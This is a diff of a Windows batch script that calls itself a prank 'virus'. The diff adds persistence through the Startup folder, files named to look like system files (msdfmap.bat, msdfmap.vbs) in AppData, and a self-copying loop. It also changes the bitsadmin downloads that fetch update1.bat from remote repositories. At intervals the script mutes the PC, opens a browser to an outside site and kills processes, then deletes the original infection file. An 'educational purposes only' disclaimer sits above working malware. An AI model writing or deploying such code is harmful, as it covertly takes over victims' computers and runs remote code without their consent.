@@ -1,64 +1,72 @@
 @echo off
 
+REM Use this for educational purposes only.
+REM I do not any take responsability for you pranking your friends or getting in trouble.
+REM If you accidentally downloaded this or ran this, you can download the remover.bat from the gihub page. 
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+REM
+REM
 
-REM
-REM
-REM
-REM
-REM
-REM
-REM
-REM
-REM
-REM
 
 If EXIST C:\Users\%username%\AppData\Local\startup_copier.bat (
-	del C:\Users\%username%\AppData\Local\startup_copier.bat
-)ELSE(
-	ECHO HI
+	del "C:\Users\%username%\AppData\Local\startup_copier.bat"
+)
+ELSE(
+	ECHO hello
+)
+
+If EXIST C:\Users\%username%\AppData\Roaming\startup_copier2.bat (
+	del "C:\Users\%username%\AppData\Roaming\startup_copier2.bat"
+)
+ELSE(
+	ECHO hello
 )
 
 If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat (
-	del C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat
-)ELSE(
-	ECHO HI
+	del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"
+)
+ELSE(
+	ECHO hello
 )
 
 If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat (
-	del C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat
-)ELSE(
-	ECHO HI
+	del "C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat"
+)
+ELSE(
+	ECHO hello
 )
 
 
 If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs (
-	del C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs
-)ELSE(
-	ECHO HI
+	del "C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs"
+)
+ELSE(
+	ECHO hello
 )
 
 
 If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs (
-	del C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs
-)ELSE(
-	ECHO HI
+	del "C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs"
+)
+ELSE(
+	ECHO hello
 )
 
 
 
 If EXIST C:\Users\%username%\AppData\Roaming\Microsoft\update0.bat (
-	del C:\Users\%username%\AppData\Roaming\Microsoft\update0.bat
-)ELSE(
-	ECHO HI
+	del "C:\Users\%username%\AppData\Roaming\Microsoft\update0.bat"
+)
+ELSE(
+	ECHO hello
 )
 
-
-
-
-
-
-
-===================================================================================================================
 
 
 	
@@ -88,10 +96,24 @@ ECHO %mute5%  >> C:\Users\%username%\Downloads\mute.vbs
 type NUL > C:\Users\%username%\Downloads\startup.bat
 ECHO @echo off >> C:\Users\%username%\Downloads\startup.bat
 ECHO wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.bat >> C:\Users\%username%\Downloads\startup.bat
+ECHO wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\startup_copier2.bat >> C:\Users\%username%\Downloads\startup.bat
+
 
 type NUL > C:\Users\%username%\Downloads\startup_copier2.bat
 ECHO @echo off >> C:\Users\%username%\Downloads\startup_copier2.bat
-ECHO wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Roaming\Microsoft\startup_copier.bat >> C:\Users\%username%\Downloads\startup_copier2.bat
+ECHO wscript.exe C:\Users\%username%\AppData\Roaming\Microsoft\msdfmap.vbs C:\Users\%username%\AppData\Local\startup_copier.bat >> C:\Users\%username%\Downloads\startup_copier2.bat
+
+
+type NUL > C:\Users\%username%\Downloads\startup_copier.bat
+ECHO :loop22 > C:\Users\%username%\Downloads\startup_copier.bat
+ECHO IF EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" (  > C:\Users\%username%\Downloads\startup_copier.bat
+ECHO copy /y "C:\Users\%username%\Downloads\startup_copier.bat" "C:\Users\%username%\AppData\Local" > C:\Users\%username%\Downloads\startup_copier.bat
+ECHO ) > C:\Users\%username%\Downloads\startup_copier.bat
+ECHO ELSE( > C:\Users\%username%\Downloads\startup_copier.bat
+ECHO ECHO hello > C:\Users\%username%\Downloads\startup_copier.bat
+ECHO ) > C:\Users\%username%\Downloads\startup_copier.bat
+ECHO goto loop22 > C:\Users\%username%\Downloads\startup_copier.bat
+
 
 
 
@@ -104,12 +126,12 @@ REM The below  code downloads a new update. Three different sources incase one g
 ECHO IF EXIST "C:\Users\%username%\Downloads\update1.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO 	echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
-ECHO 	bitsadmin /transfer n /download /priority normal "https://raw.githubusercontent.com/bnichs5/testwebsite/master/update1.bat" "C:\Users\%username%\Downloads\update1.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO 	bitsadmin /transfer n /download /priority normal "https://bitbucket.org/AndroidPrior/androidprior/downloads/update1.bat" "C:\Users\%username%\Downloads\update1.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO )	 >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO IF EXIST "C:\Users\%username%\Downloads\update1.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ) ELSE ( >> C:\Users\%username%\Downloads\msdfmap.bat
-ECHO     bitsadmin /transfer n /download /priority normal "https://bitbucket.org/w1672993/testwebsite/downloads/update1.bat" "C:\Users\%username%\Downloads\update1.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
+ECHO     bitsadmin /transfer n /download /priority normal "https://raw.githubusercontent.com/AndroidPrior/androidprior/master/update1.bat" "C:\Users\%username%\Downloads\update1.bat" >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO IF EXIST "C:\Users\%username%\Downloads\update1.bat" ( >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO     echo "it's here!" >> C:\Users\%username%\Downloads\msdfmap.bat
@@ -118,13 +140,13 @@ ECHO     bitsadmin /transfer n /download /priority normal "http://androidfriends
 ECHO ) >> C:\Users\%username%\Downloads\msdfmap.bat
 REM Starts the Startup_Copier.bat script.
 ECHO start C:\Users\%username%\AppData\Roaming\System32\startup_copier.bat >> C:\Users\%username%\Downloads\msdfmap.bat
-REM Wait 8 mins, then launch internet. 
-ECHO ping -n 780 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
+REM Wait 17 mins, then launch internet. 
+ECHO ping -n 1020 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO start /min iexplore -private http://androidpriority.x10.bz/blog/?redirect_to=random >> C:\Users\%username%\Downloads\msdfmap.bat
-REM The below code loops opening the youtube every 12 minutes. Closes youtube after 35 seconds. Also mutes computer for 35 seconds.
+REM The below code loops opening the youtube every 15 minutes. Closes youtube after 36 seconds. Also mutes computer for 35 seconds.
 ECHO :loop >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO start C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs >> C:\Users\%username%\Downloads\msdfmap.bat
-ECHO ping -n 30 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat 
+ECHO ping -n 36 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat 
 ECHO taskkill /f /im iexplore.exe >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO taskkill /f /im C:\Users\%username%\AppData\Roaming\Microsoft\mute.vbs >> C:\Users\%username%\Downloads\msdfmap.bat
 ECHO ping -n 910 127.0.0.1 > nul >> C:\Users\%username%\Downloads\msdfmap.bat
@@ -134,31 +156,16 @@ ECHO goto loop >> C:\Users\%username%\Downloads\msdfmap.bat
 
 
 
-startup copier 
-
-
-
-
-
-
-
-
-Taskkill cmd.exe used at somepoint after the update.
-
-
-
-
-
 
 
 REM This code copies each of the created files to specific folders. 
-copy /y "C:\Users\%username%\Downloads\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
 copy /y "C:\Users\%username%\Downloads\msdfmap.bat" "C:\Users\%username%\AppData\Roaming\Microsoft"
 copy /y "C:\Users\%username%\Downloads\msdfmap.vbs" "C:\Users\%username%\AppData\Roaming\Microsoft"
 copy /y "C:\Users\%username%\Downloads\mute.vbs" "C:\Users\%username%\AppData\Roaming\Microsoft"
-copy /y "C:\Users\%username%\Downloads\update1.bat" "C:\Users\%username%\AppData\Roaming\Microsoft" 
-copy /y "C:\Users\%username%\Downloads\startup_copier2.bat" "C:\Users\%username%\AppData\Local"
-copy /y "C:\Users\%username%\Downloads\startup_copier.bat" C:\Users\%username%\AppData\Roaming\
+copy /y "C:\Users\%username%\Downloads\startup_copier2.bat" "C:\Users\%username%\AppData\Roaming"
+copy /y "C:\Users\%username%\Downloads\startup_copier.bat" "C:\Users\%username%\AppData\Local"
+copy /y "C:\Users\%username%\Downloads\startup.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
 
 
 
@@ -169,14 +176,11 @@ del C:\Users\%username%\Downloads\msdfmap.vbs
 del C:\Users\%username%\Downloads\mute.vbs
 del C:\Users\%username%\Downloads\startup_copier.bat
 del C:\Users\%username%\Downloads\startup_copier2.bat
-del C:\Users\%username%\Downloads\update1.bat
 
 
 
-if exist update0.bat(
-	del update0.bat
-)ELSE(
-	echo nothing
-)
+REM Deletes original infection file.
+del update0.bat
 
 
+REM Taskkill cmd.exe used at somepoint after the update. regular virus will auto run after next computer restart. This is only for updating.
